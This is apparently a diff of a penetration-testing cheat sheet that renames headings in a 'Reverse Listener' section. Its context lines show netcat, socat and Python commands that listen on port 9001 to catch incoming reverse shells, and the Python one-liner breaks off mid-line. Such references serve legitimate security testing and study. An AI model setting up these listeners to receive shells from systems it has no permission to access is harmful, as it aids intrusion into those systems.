@@ -46,19 +46,19 @@
 
 ## Reverse Listener
 
-### Netcat
+### Netcat-l
 
 ```bash
 nc -lvnp 9001
 ```
 
-### Socat
+### Socat-l
 
 ```bash
 socat -d -d TCP-LISTEN:9001 STDOUT
 socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:9001
 ```
-### Python
+### Python-l
 
 ```python
 python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9001));s1.listen(1);c,a=s1.accept();
